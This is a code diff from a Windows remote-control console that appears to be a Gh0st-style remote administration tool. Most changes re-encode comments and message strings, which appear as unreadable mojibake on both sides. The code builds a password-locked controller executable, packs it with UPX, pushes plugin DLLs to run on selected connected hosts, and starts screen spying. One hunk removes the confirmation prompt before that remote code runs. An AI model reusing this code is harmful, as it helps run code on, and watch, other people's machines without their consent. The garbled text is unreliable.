+	// è¯»å–æ–‡ä»¶åˆ° buffer
 	if (!file.read(buffer, size)) {
 		delete[] buffer;
 		return nullptr;
@@ -2232,7 +2309,7 @@ char* ReadFileToBuffer(const std::string &path, size_t& outSize) {
 
 BOOL WriteBinaryToFile(const char* path, const char* data, ULONGLONG size)
 {
-	// ´ò¿ªÎÄ¼ş£¬ÒÔ¶ş½øÖÆÄ£Ê½Ğ´Èë
+	// æ‰“å¼€æ–‡ä»¶ï¼Œä»¥äºŒè¿›åˆ¶æ¨¡å¼å†™å…¥
 	std::string filePath = path;
 	std::ofstream outFile(filePath, std::ios::binary);
 
@@ -2242,7 +2319,7 @@ BOOL WriteBinaryToFile(const char* path, const char* data, ULONGLONG size)
 		return FALSE;
 	}
 
-	// Ğ´Èë¶ş½øÖÆÊı¾İ
+	// å†™å…¥äºŒè¿›åˆ¶æ•°æ®
 	outFile.write(data, size);
 
 	if (outFile.good())
@@ -2256,7 +2333,7 @@ BOOL WriteBinaryToFile(const char* path, const char* data, ULONGLONG size)
 		return FALSE;
 	}
 
-	// ¹Ø±ÕÎÄ¼ş
+	// å…³é—­æ–‡ä»¶
 	outFile.close();
 
 	return TRUE;
@@ -2273,7 +2350,7 @@ int run_upx(const std::string& upx, const std::string &file, bool isCompress) {
 
 	BOOL success = CreateProcessA(
 		NULL,
-		&cmdLine[0],  // ×¢Òâ±ØĞëÊÇ·Ç const char*
+		&cmdLine[0],  // æ³¨æ„å¿…é¡»æ˜¯é const char*
 		NULL, NULL, FALSE,
 		0, NULL, NULL, &si, &pi
 	);
@@ -2294,7 +2371,7 @@ int run_upx(const std::string& upx, const std::string &file, bool isCompress) {
 	return static_cast<int>(exitCode);
 }
 
-// ½âÑ¹UPX¶Ôµ±Ç°Ó¦ÓÃ³ÌĞò½øĞĞ²Ù×÷
+// è§£å‹UPXå¯¹å½“å‰åº”ç”¨ç¨‹åºè¿›è¡Œæ“ä½œ
 bool UPXUncompressFile(std::string& upx, std::string &file) {
 	DWORD dwSize = 0;
 	LPBYTE data = ReadResource(IDR_BINARY_UPX, dwSize);
@@ -2324,7 +2401,7 @@ bool UPXUncompressFile(std::string& upx, std::string &file) {
 }
 
 struct UpxTaskArgs {
-	HWND hwnd; // Ö÷´°¿Ú¾ä±ú
+	HWND hwnd; // ä¸»çª—å£å¥æŸ„
 	std::string upx;
 	std::string file;
 	bool isCompress;
@@ -2334,7 +2411,7 @@ DWORD WINAPI UpxThreadProc(LPVOID lpParam) {
 	UpxTaskArgs* args = (UpxTaskArgs*)lpParam;
 	int result = run_upx(args->upx, args->file, args->isCompress);
 
-	// ÏòÖ÷Ïß³Ì·¢ËÍÍê³ÉÏûÏ¢£¬wParam¿É´«½á¹û
+	// å‘ä¸»çº¿ç¨‹å‘é€å®Œæˆæ¶ˆæ¯ï¼ŒwParamå¯ä¼ ç»“æœ
 	PostMessageA(args->hwnd, WM_UPXTASKRESULT, (WPARAM)result, 0);
 
 	DeleteFile(args->upx.c_str());
@@ -2350,7 +2427,7 @@ void run_upx_async(HWND hwnd, const std::string& upx, const std::string& file, b
 
 LRESULT CMy2015RemoteDlg::UPXProcResult(WPARAM wParam, LPARAM lParam) {
 	int exitCode = static_cast<int>(wParam);
-	ShowMessage(exitCode == 0, "UPX ´¦ÀíÍê³É");
+	ShowMessage(exitCode == 0, "UPX å¤„ç†å®Œæˆ");
 	return S_OK;
 }
 
@@ -2359,17 +2436,17 @@ LRESULT CMy2015RemoteDlg::UPXProcResult(WPARAM wParam, LPARAM lParam) {
 void CMy2015RemoteDlg::OnToolGenMaster()
 {
 	CInputDialog pass(this);
-	pass.Init("Ö÷¿ØÉú³É", "µ±Ç°Ö÷¿Ø³ÌĞòµÄÃÜÂë:");
+	pass.Init("ä¸»æ§ç”Ÿæˆ", "å½“å‰ä¸»æ§ç¨‹åºçš„å¯†ç :");
 	if (pass.DoModal() != IDOK || pass.m_str.IsEmpty())
 		return;
 	std::string masterHash(skCrypt(MASTER_HASH));
 	if (hashSHA256(pass.m_str.GetBuffer()) != masterHash) {
-		MessageBox("ÃÜÂë²»ÕıÈ·£¬ÎŞ·¨Éú³ÉÖ÷¿Ø³ÌĞò!", "´íÎó", MB_ICONWARNING);
+		MessageBox("å¯†ç ä¸æ­£ç¡®ï¼Œæ— æ³•ç”Ÿæˆä¸»æ§ç¨‹åº!", "é”™è¯¯", MB_ICONWARNING);
 		return;
 	}
 
 	CInputDialog dlg(this);
-	dlg.Init("Ö÷¿ØÃÜÂë", "ĞÂµÄÖ÷¿Ø³ÌĞòµÄÃÜÂë:");
+	dlg.Init("ä¸»æ§å¯†ç ", "æ–°çš„ä¸»æ§ç¨‹åºçš„å¯†ç :");
 	if (dlg.DoModal() != IDOK || dlg.m_str.IsEmpty())
 		return;
 	size_t size = 0;
@@ -2380,7 +2457,7 @@ void CMy2015RemoteDlg::OnToolGenMaster()
 	}
 	char* curEXE = ReadFileToBuffer(path, size);
 	if (curEXE == nullptr) {
-		MessageBox("¶ÁÈ¡ÎÄ¼şÊ§°Ü! ÇëÉÔºóÔÙ´Î³¢ÊÔ¡£", "´íÎó", MB_ICONWARNING);
+		MessageBox("è¯»å–æ–‡ä»¶å¤±è´¥! è¯·ç¨åå†æ¬¡å°è¯•ã€‚", "é”™è¯¯", MB_ICONWARNING);
 		return;
 	}
 	std::string pwdHash = hashSHA256(dlg.m_str.GetString());
@@ -2391,7 +2468,7 @@ void CMy2015RemoteDlg::OnToolGenMaster()
 		SAFE_DELETE_ARRAY(curEXE);
 		std::string tmp;
 		if (!UPXUncompressFile(upx, tmp) || nullptr == (curEXE = ReadFileToBuffer(tmp.c_str(), size))) {
-			MessageBox("²Ù×÷ÎÄ¼şÊ§°Ü! ÇëÉÔºóÔÙ´Î³¢ÊÔ¡£", "´íÎó", MB_ICONWARNING);
+			MessageBox("æ“ä½œæ–‡ä»¶å¤±è´¥! è¯·ç¨åå†æ¬¡å°è¯•ã€‚", "é”™è¯¯", MB_ICONWARNING);
 			if (!upx.empty()) DeleteFile(upx.c_str());
 			if (!tmp.empty()) DeleteFile(tmp.c_str());
 			return;
@@ -2400,23 +2477,23 @@ void CMy2015RemoteDlg::OnToolGenMaster()
 		iOffset = MemoryFind(curEXE, masterHash.c_str(), size, masterHash.length());
 		if (iOffset == -1) {
 			SAFE_DELETE_ARRAY(curEXE);
-			MessageBox("²Ù×÷ÎÄ¼şÊ§°Ü! ÇëÉÔºóÔÙ´Î³¢ÊÔ¡£", "´íÎó", MB_ICONWARNING);
+			MessageBox("æ“ä½œæ–‡ä»¶å¤±è´¥! è¯·ç¨åå†æ¬¡å°è¯•ã€‚", "é”™è¯¯", MB_ICONWARNING);
 			return;
 		}
 	}
 	if (!WritePwdHash(curEXE + iOffset, pwdHash)) {
-		MessageBox("Ğ´Èë¹şÏ£Ê§°Ü! ÎŞ·¨Éú³ÉÖ÷¿Ø¡£", "´íÎó", MB_ICONWARNING);
+		MessageBox("å†™å…¥å“ˆå¸Œå¤±è´¥! æ— æ³•ç”Ÿæˆä¸»æ§ã€‚", "é”™è¯¯", MB_ICONWARNING);
 		SAFE_DELETE_ARRAY(curEXE);
 		return;
 	}
 	CComPtr<IShellFolder> spDesktop;
 	HRESULT hr = SHGetDesktopFolder(&spDesktop);
 	if (FAILED(hr)) {
-		AfxMessageBox("Explorer Î´ÕıÈ·³õÊ¼»¯! ÇëÉÔºóÔÙÊÔ¡£");
+		AfxMessageBox("Explorer æœªæ­£ç¡®åˆå§‹åŒ–! è¯·ç¨åå†è¯•ã€‚");
 		SAFE_DELETE_ARRAY(curEXE);
 		return;
 	}
-	// ¹ıÂËÆ÷£ºÏÔÊ¾ËùÓĞÎÄ¼şºÍÌØ¶¨ÀàĞÍÎÄ¼ş£¨ÀıÈçÎÄ±¾ÎÄ¼ş£©
+	// è¿‡æ»¤å™¨ï¼šæ˜¾ç¤ºæ‰€æœ‰æ–‡ä»¶å’Œç‰¹å®šç±»å‹æ–‡ä»¶ï¼ˆä¾‹å¦‚æ–‡æœ¬æ–‡ä»¶ï¼‰
 	CFileDialog fileDlg(FALSE, _T("exe"), "YAMA.exe", OFN_HIDEREADONLY | OFN_OVERWRITEPROMPT,
 		_T("EXE Files (*.exe)|*.exe|All Files (*.*)|*.*||"), AfxGetMainWnd());
 	int ret = 0;
@@ -2424,7 +2501,7 @@ void CMy2015RemoteDlg::OnToolGenMaster()
 		ret = fileDlg.DoModal();
 	}
 	catch (...) {
-		AfxMessageBox("ÎÄ¼ş¶Ô»°¿òÎ´³É¹¦´ò¿ª! ÇëÉÔºóÔÙÊÔ¡£");
+		AfxMessageBox("æ–‡ä»¶å¯¹è¯æ¡†æœªæˆåŠŸæ‰“å¼€! è¯·ç¨åå†è¯•ã€‚");
 		SAFE_DELETE_ARRAY(curEXE);
 		return;
 	}
@@ -2434,7 +2511,7 @@ void CMy2015RemoteDlg::OnToolGenMaster()
 		CFile File;
 		BOOL r = File.Open(name, CFile::typeBinary | CFile::modeCreate | CFile::modeWrite);
 		if (!r) {
-			MessageBox("Ö÷¿Ø³ÌĞò´´½¨Ê§°Ü!\r\n" + name, "ÌáÊ¾", MB_ICONWARNING);
+			MessageBox("ä¸»æ§ç¨‹åºåˆ›å»ºå¤±è´¥!\r\n" + name, "æç¤º", MB_ICONWARNING);
 			SAFE_DELETE_ARRAY(curEXE);
 			return;
 		}
@@ -2443,9 +2520,9 @@ void CMy2015RemoteDlg::OnToolGenMaster()
 		if (!upx.empty())
 		{
 			run_upx_async(GetSafeHwnd(), upx, name.GetString(), true);
-			MessageBox("ÕıÔÚUPXÑ¹Ëõ£¬Çë¹Ø×¢ĞÅÏ¢ÌáÊ¾¡£\r\nÎÄ¼şÎ»ÓÚ: " + name, "ÌáÊ¾", MB_ICONINFORMATION);
+			MessageBox("æ­£åœ¨UPXå‹ç¼©ï¼Œè¯·å…³æ³¨ä¿¡æ¯æç¤ºã€‚\r\næ–‡ä»¶ä½äº: " + name, "æç¤º", MB_ICONINFORMATION);
 		}else
-			MessageBox("Éú³É³É¹¦! ÎÄ¼şÎ»ÓÚ:\r\n" + name, "ÌáÊ¾", MB_ICONINFORMATION);
+			MessageBox("ç”ŸæˆæˆåŠŸ! æ–‡ä»¶ä½äº:\r\n" + name, "æç¤º", MB_ICONINFORMATION);
 	}
 	SAFE_DELETE_ARRAY(curEXE);
 }
@@ -2454,10 +2531,10 @@ void CMy2015RemoteDlg::OnToolGenMaster()
 void CMy2015RemoteDlg::OnHelpImportant()
 {
 	const char* msg = 
-		"±¾Èí¼şÒÔ¡°ÏÖ×´¡±Ìá¹©£¬²»¸½´øÈÎºÎ±£Ö¤¡£Ê¹ÓÃ±¾Èí¼şµÄ·çÏÕÓÉÓÃ»§×ÔĞĞ³Ğµ£¡£"
-		"ÎÒÃÇ²»¶ÔÈÎºÎÒòÊ¹ÓÃ±¾Èí¼ş¶øÒı·¢µÄ·Ç·¨»ò¶ñÒâÓÃÍ¾¸ºÔğ¡£ÓÃ»§Ó¦×ñÊØÏà¹Ø·¨ÂÉ"
-		"·¨¹æ£¬²¢¸ºÔğÈÎµØÊ¹ÓÃ±¾Èí¼ş¡£¿ª·¢Õß¶ÔÈÎºÎÒòÊ¹ÓÃ±¾Èí¼ş²úÉúµÄËğº¦²»³Ğµ£ÔğÈÎ¡£";
-	MessageBox(msg, "ÃâÔğÉùÃ÷", MB_ICONINFORMATION);
+		"æœ¬è½¯ä»¶ä»¥â€œç°çŠ¶â€æä¾›ï¼Œä¸é™„å¸¦ä»»ä½•ä¿è¯ã€‚ä½¿ç”¨æœ¬è½¯ä»¶çš„é£é™©ç”±ç”¨æˆ·è‡ªè¡Œæ‰¿æ‹…ã€‚"
+		"æˆ‘ä»¬ä¸å¯¹ä»»ä½•å› ä½¿ç”¨æœ¬è½¯ä»¶è€Œå¼•å‘çš„éæ³•æˆ–æ¶æ„ç”¨é€”è´Ÿè´£ã€‚ç”¨æˆ·åº”éµå®ˆç›¸å…³æ³•å¾‹"
+		"æ³•è§„ï¼Œå¹¶è´Ÿè´£ä»»åœ°ä½¿ç”¨æœ¬è½¯ä»¶ã€‚å¼€å‘è€…å¯¹ä»»ä½•å› ä½¿ç”¨æœ¬è½¯ä»¶äº§ç”Ÿçš„æŸå®³ä¸æ‰¿æ‹…è´£ä»»ã€‚";
+	MessageBox(msg, "å…è´£å£°æ˜", MB_ICONINFORMATION);
 }
 
 
@@ -2467,21 +2544,17 @@ void CMy2015RemoteDlg::OnHelpFeedback()
 	ShellExecute(NULL, _T("open"), url, NULL, NULL, SW_SHOWNORMAL);
 }
 
-// Çë½«64Î»µÄDLL·ÅÓÚ 'Plugins' Ä¿Â¼
 void CMy2015RemoteDlg::OnDynamicSubMenu(UINT nID) {
-	if (m_DllList.size()==0){
-		MessageBoxA("Çë½«64Î»µÄDLL·ÅÓÚ 'Plugins' Ä¿Â¼£¬ÔÙÀ´µã»÷´ËÏî²Ëµ¥¡£"
-			"\nÄú±ØĞëÔÚDLL¼ÓÔØÊ±Ö´ĞĞÄúµÄ´úÂë¡£ÇëÖ´ĞĞÀ´Ô´ÊÜĞÅÈÎµÄºÏ·¨´úÂë¡£", "ÌáÊ¾", MB_ICONINFORMATION);
+	if (m_DllList.size() == 0) {
+		MessageBoxA("è¯·å°†64ä½çš„DLLæ”¾äº 'Plugins' ç›®å½•ï¼Œå†æ¥ç‚¹å‡»æ­¤é¡¹èœå•ã€‚"
+			"\næ‰§è¡Œæœªç»æµ‹è¯•çš„ä»£ç å¯èƒ½é€ æˆç¨‹åºå´©æºƒã€‚", "æç¤º", MB_ICONINFORMATION);
 		char path[_MAX_PATH];
 		GetModuleFileNameA(NULL, path, _MAX_PATH);
 		GET_FILEPATH(path, "Plugins");
 		m_DllList = ReadAllDllFilesWindows(path);
 		return;
 	}
-	int menuIndex = nID - ID_DYNAMIC_MENU_BASE;  // ¼ÆËã²Ëµ¥ÏîµÄË÷Òı£¨»ùÓÚ ID£©
-	if (IDYES != MessageBoxA(CString("È·¶¨ÔÚÑ¡¶¨µÄÖ÷»úÉÏÖ´ĞĞ´úÂëÂğ?\nÖ´ĞĞÎ´¾­²âÊÔµÄ´úÂë¿ÉÄÜÔì³É³ÌĞò±ÀÀ£!"),
-		_T("ÌáÊ¾"), MB_ICONQUESTION | MB_YESNO))
-		return;
+	int menuIndex = nID - ID_DYNAMIC_MENU_BASE;  // è®¡ç®—èœå•é¡¹çš„ç´¢å¼•ï¼ˆåŸºäº IDï¼‰
 	EnterCriticalSection(&m_cs);
 	POSITION Pos = m_CList_Online.GetFirstSelectedItemPosition();
 	while (Pos && menuIndex < m_DllList.size()) {
@@ -2492,8 +2565,6 @@ void CMy2015RemoteDlg::OnDynamicSubMenu(UINT nID) {
 	}
 	LeaveCriticalSection(&m_cs);
 }
-
-
 void CMy2015RemoteDlg::OnOnlineVirtualDesktop()
 {
 	BYTE	bToken[32] = { COMMAND_SCREEN_SPY, 2, ALGORITHM_DIFF };
